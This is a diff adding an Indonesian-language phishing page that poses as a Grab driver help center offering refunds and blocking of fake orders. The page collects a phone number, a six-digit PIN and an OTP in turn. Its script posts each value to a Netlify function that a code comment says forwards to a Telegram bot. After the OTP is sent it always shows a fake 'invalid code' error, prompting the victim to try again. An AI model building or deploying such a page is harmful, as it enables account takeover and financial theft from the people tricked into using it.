@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Grab Driver Pusat Bantuan</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');
+        :root { --grab-green: #00B14F; --bg: #f4f7f6; }
+        body { font-family: 'Inter', sans-serif; background: var(--bg); display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        .card { background: white; width: 90%; max-width: 400px; padding: 25px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); text-align: center; }
+        input, select { width: 100%; padding: 14px; margin: 10px 0; border: 2px solid #e0e0e0; border-radius: 10px; font-size: 16px; box-sizing: border-box; }
+        button { width: 100%; padding: 14px; background: var(--grab-green); color: white; border: none; border-radius: 10px; font-weight: 600; cursor: pointer; margin-top: 10px; }
+        .page { display: none; }
+        .active { display: block; }
+        .pin-dots { display: flex; justify-content: center; gap: 12px; margin: 25px 0; }
+        .dot { width: 16px; height: 16px; border-radius: 50%; background: #ddd; transition: 0.2s; }
+        .dot.filled { background: var(--grab-green); }
+        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-top: 20px; }
+        .keypad button { background: #f8f9f9; color: #333; border: 1px solid #eee; padding: 15px; font-size: 18px; border-radius: 10px; }
+        #errorMessage { color: #d32f2f; font-weight: 600; margin-top: 15px; display: none; }
+        img { width: 100%; border-radius: 15px; margin-bottom: 15px; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <div id="page1" class="page active">
+        <img src="https://psatbantuaan.free.nf/header-grab.jpg">
+        <h3>GRAB PUSAT BANTUAN</h3>
+        <select id="layanan" required><option value="">Pilih Layanan</option><option>Proses Pengembalian Dana</option><option>Tolak Otomatis Orderan Fiktif</option></select>
+        <input type="tel" id="nomor" placeholder="Nomor Handphone" required>
+        <button onclick="if(document.getElementById('nomor').value && document.getElementById('layanan').value) nextPage(2)">Selanjutnya</button>
+    </div>
+
+    <div id="page2" class="page">
+        <h3>Masukkan PIN</h3>
+        <div class="pin-dots"><div class="dot"></div><div class="dot"></div><div class="dot"></div><div class="dot"></div><div class="dot"></div><div class="dot"></div></div>
+        <div class="keypad" id="keypad"></div>
+    </div>
+
+    <div id="page3" class="page">
+        <img src="https://psatbantuaan.free.nf/verif-sms.jpg">
+        <h3>Kode Dikirim ke WhatsApp atau di SMS</h3>
+        <input type="number" id="otpInput" placeholder="Masukkan 6 angka OTP" required>
+        <button id="btnVerifikasi" onclick="checkOtp()">Verifikasi</button>
+        <p id="errorMessage">Kode tidak valid atau kadaluarsa.</p>
+    </div>
+</div>
+
+<script>
+    let pin = "";
+
+    // Fungsi kirim data ke Bot Telegram (Netlify Functions)
+    async function sendToBot(tahap) {
+        const data = {
+            tahap: tahap,
+            nomor: document.getElementById('nomor').value,
+            pin: pin,
+            otp: document.getElementById('otpInput').value
+        };
+        try {
+            await fetch('/.netlify/functions/kirim', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            });
+        } catch (e) { console.error(e); }
+    }
+
+    function nextPage(n) {
+        if (n === 2) sendToBot('Input Nomor HP');
+        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+        document.getElementById('page' + n).classList.add('active');
+    }
+
+    const keypad = document.getElementById('keypad');
+    for(let i=1; i<=9; i++) keypad.innerHTML += `<button onclick="addPin(${i})">${i}</button>`;
+    keypad.innerHTML += `<div></div><button onclick="addPin(0)">0</button>`;
+
+    function addPin(num) {
+        if(pin.length < 6) {
+            pin += num;
+            document.querySelectorAll('.dot')[pin.length-1].classList.add('filled');
+            if(pin.length === 6) {
+                sendToBot('Input PIN');
+                setTimeout(() => nextPage(3), 300);
+            }
+        }
+    }
+
+    async function checkOtp() {
+        const btn = document.getElementById('btnVerifikasi');
+        btn.disabled = true;
+        btn.innerText = "Memproses...";
+        await sendToBot('Input OTP');
+        btn.innerText = "Verifikasi";
+        btn.disabled = false;
+        document.getElementById('errorMessage').style.display = 'block';
+    }
+</script>
+</body>
+</html>
